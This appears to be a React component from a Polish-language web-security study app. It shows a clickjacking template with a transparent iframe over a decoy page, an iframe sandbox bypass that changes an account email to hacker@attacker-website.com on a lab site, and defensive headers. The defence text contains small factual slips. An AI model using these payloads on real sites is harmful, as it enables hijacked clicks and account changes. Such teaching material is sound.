import clickjacking from '../../../assets/clickjacking.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const ClickjackingUI = () =>{
    return(
        <section>
            <h1>Clickjacking (UI redressing)</h1>
            <ExampleFrame screen={clickjacking} />
            <div className='waring'>
                <p>{`<head>`}</p>
                <p className='tab-1'>{`<style>`}</p>
                <p className='tab-2'>{`#target_website {`}</p>
                <p className='tab-3'>position:relative;</p>
                <p className='tab-3'>width:128px;</p>
                <p className='tab-3'>height:128px;</p>
                <p className='tab-3'>opacity:0.00001;</p>
                <p className='tab-3'>z-index:2;</p>
                <p className='tab-3'>{`}`}</p>
                <p className='tab-2'>{`#decoy_website {`}</p>
                <p className='tab-3'>position:absolute;</p>
                <p className='tab-3'>width:300px;</p>
                <p className='tab-3'>height:400px;</p>
                <p className='tab-3'>z-index:1;</p>
                <p className='tab-3'>{`}`}</p>
                <p className='tab-1'>{`</style>`}</p>
                <p>{`</head>`}</p>
                <p>...</p>
                <p>{`<body>`}</p>
                <p className='tab-1'>{`<div id="decoy_website">`}</p>
                <p className='tab-1'>...decoy web content here...</p>
                <p className='tab-1'>{`</div>`}</p>
                <p className='tab-1'>{`<iframe id="target_website" src="https://vulnerable-website.com">`}</p>
                <p className='tab-1'>{`</iframe>`}</p>
                <p>{`</body>`}</p>
            </div>

            <hr />
            <details>
                <summary>Sandbox</summary>
                <p>Obchodzenie zabezpieczeń poprzez sandbox</p>
                <p><span className='important'>allow-forms</span> lub <span className='important'>allow-scripts</span></p>
                <div className='waring'>
                    <p>{`<iframe `}<span className='important'>sandbox="allow-forms"</span> {`src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`}</p>
                </div>
            </details>


            <hr />
            <details className='defense'>
                <summary>Zabezpieczenie</summary>
                <h2 className='defense'>X-Frame-Options:</h2>
                <p className='defense'>domyślnie wartość <span className='important'>deny</span></p>
                <p className='defense'>Można ograniczyć dostęp poprzez wartość <span className='important'>sameorigin</span></p>
                <p className='defense'>Przykład - <u>X-Frame-Options: sameorigin</u></p>
                <p className='defense'>Ograniczenie poprzez <span className='important'>allow-from</span> lub <span className='important'>allow-scripts</span></p>
                <p className='defense'>Przykład - <u>X-Frame-Options: allow-from https://normal-website.com</u></p>
                <br />
                <h2 className='defense'>Content Security Policy (CSP)</h2>
                <p className='defense'>Ustawienie CSP poprzez ograniczenie Iframe poprzez clickjacking/XXS</p>
                <p className='defense'><u>Content-Security-Policy: frame-ancestors 'self';</u> ewentualnie <u>Content-Security-Policy: frame-ancestors normal-website.com;</u></p>
            </details>
        </section>
    )
}

export default ClickjackingUI;